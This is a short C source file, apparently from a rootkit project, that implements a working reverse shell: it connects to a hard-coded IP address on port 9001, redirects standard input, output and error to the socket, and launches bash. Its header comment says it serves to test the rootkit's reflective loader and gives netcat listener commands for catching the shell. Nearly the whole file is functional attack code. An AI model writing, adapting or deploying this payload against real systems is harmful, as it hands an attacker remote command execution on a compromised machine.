/*
    * This file contains code for a simple reverse shell
    * This code is used to check the reflective loader of the rootkit
    * You can open the terminal using netcat with the following commands 
        ? netcat Freebsd: nc -lvn 9001
        ? netcat: nc -lvnp 9001
    * https://www.revshells.com/
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#pragma message ("Compiling: "__FILE__)

#define SHELL "bash"
#define SERVER_PORT 9001
#define SERVER_IP "192.168.50.2"

int main(void){
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(SERVER_PORT);
    revsockaddr.sin_addr.s_addr = inet_addr(SERVER_IP);


    connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {SHELL, NULL};
    execvp(SHELL, argv);

    return 0;       
}